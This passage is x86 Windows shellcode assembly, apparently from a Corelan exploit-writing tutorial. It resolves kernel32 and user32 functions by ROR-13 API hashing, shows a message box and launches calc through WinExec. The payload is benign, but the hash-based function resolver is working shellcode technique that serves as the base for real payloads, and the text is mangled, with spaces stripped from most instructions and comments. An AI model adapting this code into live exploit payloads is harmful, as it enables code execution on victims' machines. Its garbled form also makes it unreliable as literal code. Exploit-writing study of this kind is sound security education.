;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28] ;see if computed hash matches requested hash (at
esp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
mov eax, [ebx + 4 * ecx] ;get relative function offset from its ordinaland putin
eax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret
;=======Function : loop to lookup functions for a given dll (process all
hashes)============
find_funcs_for_dll:
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
mov[edi],eax ;writefunctionpointerintoaddressatedi
addesp,0x08
addedi,0x04 ;increaseeditostorenextpointer
cmpesi,ecx ;didweprocessallhashesyet?
jnefind_funcs_for_dll ;getnexthashandlookupfunctionpointer
find_funcs_for_dll_finished:
Ret
;=======Function:GetpointertoMessageBoxTitle============
GetTitle: ;Definelabelforlocationofwinexecargumentstring
callTitleReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"Corelan" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:GetpointertoMessageBoxText============
GetText: ;Definelabelforlocationofmsgboxargumentstring
callTextReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"Areyousureyouwanttolaunchcalc?";Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointertowinexecargumentcalc============
GetArg: ;Definelabelforlocationofwinexecargumentstring
callArgReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"calc" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointertouser32.dlltext============
GetUser32: ;Definelabelforlocationofuser32.dllstring
callUser32Return ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"user32.dll" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointerstofunctionhashes============
GetHashes:
callGetHashesReturn
;LoadLibraryA hash:0x8E4E0EEC
db0x8E
db0x4E
db0x0E
db0xEC
;ExitProcess hash=0x7ED8E273
db0x7E
db0xD8
db0xE2
db0x73
;WinExec hash=0x98FE8A0E
db0x98
db0xFE
db0x8A
db0x0E
GetMsgBoxHash:
callGetMsgBoxHashReturn
;MessageBoxA hash=0xA8A24DBC
db0xA8
db0xA2
db0x4D
db0xBC
;====================================================================
;===================MAINAPPLICATION===============================
;====================================================================
start_main:
subesp,0x0c ;allocatespaceonstacktostore3things:
;inthisorder:ptrtoLoadLibraryA,ExitProc,WinExec
movebp,esp ;setebpasframeptrforrelativeoffset
;sowewillbeabletodothis:
;callebp+4 =ExecuteLoadLibraryA
;callebp+8 =ExecuteExitProcess
;callebp+c =ExecuteWinExec
callfind_kernel32
movedx,eax ;savebaseaddressofkernel32inedx
;locate functionsinsidekernel32first
jmpGetHashes ;getaddressoffirst(LoadLibrary)hash
GetHashesReturn:
popesi ;getpointertohashintoesi
leaedi,[ebp+0x4] ;wewillstorethefunctionaddressesatedi
;(ediwillbeincreasedwith0x04foreachhash)
;(seeresolve_symbols_for_dll)
movecx,esi
addecx,0x0c ;storeaddressoflasthashintoecx
callfind_funcs_for_dll ;getfunctionpointersforthe2
;kernel32functionhashes
;andputthematebp+4andebp+8
;locatefunctioninuser32.dll
;loadlibraryfirst-sofirstputpointertostringuser32.dlltostack
jmpGetUser32
User32Return:
;pointerto"user32.dll"isnowontopofstack,sojustcallLoadLibrary
call[ebp+0x4]
;thebaseaddressofuser32.dllisnowineax(ifloadedcorrectly)
;putitinedxsoitcanbeusedinfind_function
movedx,eax
;findtheMessageBoxAfunction
;firstgetpointertofunctionhash
jmpGetMsgBoxHash
GetMsgBoxHashReturn :
;putpointerinesiandpreparetolookupfunction
popesi
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
;functionaddressshouldbeineaxnow
;we'llkeepitthere
jmpGetTitle ;jumptothelocation
;oftheMsgBoxTitlestring
TitleReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popebx ;ebxnowpointstoTitlestring
jmpGetText ;jumptothelocation
;oftheMsgBoxTextstring
TextReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popecx ;ecxnowpointstoTextstring
;nowpushparameterstothestack
xoredx,edx ;zerooutedx
push1 ;put1onstack (buttontype1=ok+cancel)
pushebx ;putpointertoTitleonstack
pushecx ;putpointertoTextonstack
pushedx ;put0onstack (hOwner)
calleax ;callMessageBoxA(0,Text,Title,0)
;returnvalueofMessageBoxisineax
;doweneedtolaunchcalc? (soifeax!=1)
xorebx,ebx
cmpeax,ebx ;ifOKbuttonwaspressed,returnis1
jedone ;soifreturnwaszero,thengotodone
;ifweneedtolaunchcalc
jmpGetArg
ArgReturn:
;executecalc
popebx
xoreax,eax
pusheax
pushebx
call[ebp+0xc]
;ExitFunc
done:
xoreax,eax ;zeroouteax